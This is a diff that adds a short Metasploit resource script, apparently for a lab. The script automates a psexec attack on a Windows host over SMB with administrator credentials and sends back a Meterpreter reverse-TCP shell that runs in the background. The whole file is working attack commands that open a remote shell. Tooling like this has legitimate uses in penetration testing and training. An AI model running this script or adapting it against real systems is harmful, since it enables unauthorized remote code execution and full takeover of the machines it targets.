@@ -1,0 +1,22 @@
+# msfconsole resource file to create meterp session using psexec
+# --> assumes a multi-handler exists
+# $Author: kernelsmith
+# $Name: auto-psexec
+
+use exploit/windows/smb/psexec
+# RHOST RPORT SHARE SMBDomain SMBPass SMBUser
+set RHOST 192.168.170.128
+set RPORT 445 # just in case
+set SMBUser administrator
+set SMBPass	lab
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+# EXITFUNC LHOST LPORT
+set LPORT 4443
+set DisablePayloadHandler true
+
+# automatically figure out & set LHOST as best we can
+resource auto-LHOST
+
+# run it in the background
+exploit -j -z
